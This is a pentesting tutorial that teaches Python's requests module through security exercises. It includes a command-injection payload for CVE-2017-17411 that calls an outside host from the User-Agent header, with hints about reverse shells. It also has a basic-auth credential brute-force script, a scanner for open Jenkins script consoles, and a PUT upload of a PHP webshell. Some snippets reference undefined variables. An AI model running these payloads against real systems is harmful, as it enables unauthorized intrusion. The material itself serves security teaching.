# Python for Pentesters - exploring requests module :

> requests 

Installing the external module :
```Python
pip install requests 
```
Using the external module requests :
```Python
import requests 
response = requests.get("https://google.com/")
print("Print the response content in string format : ", response.text)
```
Getting response content in byte format(Binary Response content) :
```Python
response = requests.get("http://shell-storm.org/shellcode/files/shellcode-811.php")
print(response.content)
```
Check the response code for any request :
```Python
response = requests.get("http://shell-storm.org/shellcode/files/shellcode-811.php")
print(response.status_code)
```
Exercise 1 : Script to check robots.txt and if it's there then print the content
```Python
import requests
file = "robots.txt"
response = requests.get(f"https://developer.mozilla.org/{file}")
if response.status_code == 200:
    print(f"Server returned 200, Content of {file} is : ", response.text)
elif response.status_code == 404:
    print("Error : File not found! Status code : ", response.status_code)
else :
    print("Error : Server returned status code : ", response.status_code)
```
By default response with .text uses UTF-8 encoding to print string but let's choose a different encoding :
```Python
response.encoding = 'utf-8'
reponse.text
```
Dealing with headers, get the response headers :
```Python
print(response.headers)
print(response.headers['Content-Security-Policy']) #only prints CSP from response headers
```
Sending custom request headers -> User-Agent :
```Python
user_agent = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0"}
response = requests.get("https://gs.statcounter.com/detect", headers=user_agent)
print(response.text)
```
Sending custom header using custom cookies :
```Python
cook_it = {"PHPSESSID": "enGHumY%2C-2De-F-TDzNHVmE%2ChY5"}
response = requests.get("http://httpbin.org/cookies", cookies=cook_it)
print(response.text)
```
Exercise 2: Exploit a command injection scenerio(CVE-2017-17411) by injecting payload in the User-Agent header 
```Python
'''
This script isn't checked against the old exploit
and is intended to demonstrate how User-Agent headers
can be used and previously been abused by attackers
Ref: https://github.com/nixawk/labs/blob/master/CVE-2017-17411/exploit-CVE-2017-17411.py
'''
import requests
vuln_url = "http://10.10.1.3"
reverse_shell = "curl http://10.10.1.2" #replace with nc or any generic msf payload
user_agent_payload = f'"; echo {reverse_shell};'
construct_header = {"User-Agent": user_agent_payload}
response = requests.get(vuln_url, headers=construct_header)
if response.status_code == 200:
    print("Vulnerable")
else :
    print("May not be vulnerable /  check manually !")
```
> *Note* : There are multiple easy exploits (found in past) using header manipulation, try to reproduce and rewrite those exploits  

Web request with parameters in the get request :
```Python
search_query_param = {'q': 'requests+language:python'}
response = requests.get(
    'https://api.github.com/search/repositories',
    params= search_query_param,
)
print(response.text)
```
Web GET request with multiple params - 
```Python
'''
Reproducing an api call - http://api.open-notify.org/iss-pass.json?lon=12.730663&lat=47.040182
'''
search_query_param = {
    'lat' : '47.040182',
    'lon' : '12.730663', 
}
response = requests.get(
    'http://api.open-notify.org/iss-pass.json',
    params= search_query_param,
)
print(response.text)
# since response is in json, we can store the value in dictionary key:value pair
store_json = response.json()
print(store_json['response'])
```
Web POST request with data :
```Python
#Post request with param
response = requests.post('https://httpbin.org/post', data={'key':'value'})
#Post request with json request as param
json_par = {
    'key' : 'value' 
    }
response = requests.post('https://httpbin.org/post', json= json_par)
```
Setting timeout with request 
```Python
response = requests.get("https://google.com",  timeout=10) #time in seconds
```
Ignore verifying the SSL certificate -> verify=False,
```Python
response = requests.get("https://google.com", verify=False, timeout=10) #time in seconds
```
Exercise 3: Given the list of urls (fetched from intern pentest recon), search for the unauthenticated 
jenkins script console instance 

> url_list = ["https://192.168.56.2:8080","https://192.168.56.8:8080","https://192.168.56.19:8080","https://192.168.56.88:8080","https://192.168.56.67:8080"]

```Python
import requests
url_list = ["https://192.168.56.2:8080","https://192.168.56.8:8080","https://192.168.56.19:8080","https://192.168.56.88:8080","https://192.168.56.67:8080"]
script_dir = "/script"
vulnerable = []
for url in url_list:
    nurl = url + script_dir
    response = requests.get(nurl, verify=False, timeout=10)
    if response.status_code == 200:
        print(f"VULNERABL : URL {url} Could be vulnerable, check manually!")
        vulnerable.append(url)
    else :
        print(f"URL {url} is Not Vulnerable")
print("List of vulnerable endpoints : ", vulnerable)
```
> *Tip* : If you can find any open script console then you might be able to get a reverse shell using groovy script in an internal/external pentest. Read more at : https://blog.pentesteracademy.com/abusing-jenkins-groovy-script-console-to-get-shell-98b951fa64a6

Authentication with requests : 

Basic Auth :
```Python
from requests.auth import HTTPBasicAuth
requests.get('https://api.github.com/user', auth=HTTPBasicAuth('user', 'pass'))
```
You can also avoid hardcoding creds by requesting password via getpass
```Python
from requests.auth import HTTPBasicAuth
from getpass import getpass
requests.get('https://api.github.com/user', auth=HTTPBasicAuth('username', getpass())) #prompt user for password
```
DigestAuth :
```Python
from requests.auth import HTTPDigestAuth
url = 'https://httpbin.org/digest-auth/auth/user/pass'
response = requests.get(url, auth=HTTPDigestAuth('user', 'pass'))
print(response.text)
```
Exercise 4: You have a list of webapp url (routers, printers, web app etc) in an internal pentest and they are using Basic Auth without any protection. There could be possibilities that those are vulnerable to weak credentials attack. Using a dictionary or default username:password list, try to get into the admin dashboard.
```Python
'''
This script is to demonstrate basic auth bruteforce 
and doesn't handle errors / supress warnings / exceptions
'''
from requests.auth import HTTPBasicAuth
import requests
url_list = ["https://httpbin.org/basic-auth/foo/bar", "http://192.168.23.98/login", "http://192.168.23.33/login"]
usernames = ["admin", "user", "username", "guest", "root", "user", "foo"]
passwords = ["admin", "password", " ", "guest", "root", "12345", "123456", "bar", "pass"]
for url in url_list:
    for user in usernames:
        for passw in passwords:
            response = requests.get(url, auth=HTTPBasicAuth(user, passw), verify=False, timeout=10)
            if response.status_code == 200:
                print(f"Success! : URL {url} Could be vulnerable, check manually! Creds -> {user}:{passw}")
            else :
                print(f"Wrong Credentials!")
```
> *Tips* : You can find a whole list of default credentials (vendor wise) here - https://cirt.net/passwords

There are authentication mechanism which can be used with requests but we will see other libraries for that. 

Session Object in requests : 
Can be used to persist a session for authenticating once and 
using the session object to perform other tasks with a session
holding the cookies and other initial objects

Session object to show cookie persistence in a session 
```Python
s = requests.Session()

s.get('https://httpbin.org/cookies/set/sessioncookie/123456789')
response = s.get('https://httpbin.org/cookies')

print(r.text)
```
Session object example :
```Python
'''
Taken from : https://kishstats.com/python/2019/03/01/python-requests-posting-data.html
'''
import requests

with requests.Session() as s:
    res = s.get('https://httpbin.org/cookies/set/abc/123')
    print(f'res: {res.text}')

    res = s.get('https://httpbin.org/cookies')
    print(f'res: {res.text}')
    # Outputs
    # res: {
    #   "cookies": {
    #     "abc": "123"
    #   }
    # }
    print(s.cookies)  # <RequestsCookieJar[<Cookie abc=123 for httpbin.org/>]>
    print(f'actual cookies: {s.cookies.get_dict()}')  # actual cookies: {'abc': '123'}
```
Using Proxies with requests :
Using proxies in your http requests can help you check your
web request or route it through some proxy tools like BurpSuite
for other actions. I always use to add proxy my web based exploits through burp to check how the request is being constructed and how debug it or trigger some API calls present in the burp history so later I can work on those. 

```Python
import requests

proxies = {
  'http': 'http://127.0.0.1:8080',
  'https': 'http://127.0.0.1:1080',
}

requests.get('http://example.org', proxies=proxies)
```

> Try to see the request being made by some web based exploits which are written in python and see how it works. Example : struts RCE 

Uploading Files using POST request :
```Python
with open('hex.xml','rb') as payload:
    url = 'http://httpbin.org/post'
    head = {'content-type': 'application/xml'}
    response = requests.post(url, data=payload, headers=head, proxies=proxies)
```
> *Explore* : requests also support HEAD, DELETE, PATCH etc http methods


PUT http method using requests :
Some times it's better to check what methods are enabled or supported by the server for a particular request. If a server allows an API GET request, it is worth to check other allowed methods using OPTIONS method (if enabled) or try your luck to create/upload file with content using PUT request. If the API allows writing files on server like webdav was widely abused, then an attacker can create/upload a webshell using PUT request
```Python
'''
Demo for something similar to webdav PUT method abuse
Ref : https://www.arridae.com/blogs/HTTP-PUT-method.php
'''
import requests
from requests.auth import HTTPBasicAuth
file = open('shell.php','rb')
url = 'https://httpbin.org/put/webdav/'
response = requests.put(url, files=files,auth = HTTPBasicAuth('user', 'pass'))
print(response.text)
```

We have reached to the end of this tutorial however I still have lots of other lessons/modules to discuss and we will be automating so much of our pentest work 

> *Task* : Try to automate intruder functionality using python and exploit IDOR vulnerability in lab or reproduce some POC by reading some Bug Bounty writeups


References : 
- https://realpython.com/
- https://docs.python-requests.org/
- https://www.nylas.com/blog/use-python-requests-module-rest-apis/
